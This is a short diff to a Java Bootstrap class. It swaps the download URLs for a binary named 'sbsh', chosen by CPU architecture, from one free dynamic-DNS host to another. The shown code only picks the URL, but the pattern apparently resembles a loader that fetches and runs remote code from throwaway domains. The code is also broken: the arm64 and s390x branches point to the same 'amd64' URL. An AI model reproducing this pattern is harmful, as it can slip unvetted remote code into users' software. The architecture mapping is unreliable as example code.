@@ -391,11 +391,11 @@ public class Bootstrap
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.sss.hidns.vip/sbsh";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://amd64.sss.hidns.vip/sbsh";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://amd64.sss.hidns.vip/sbsh";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
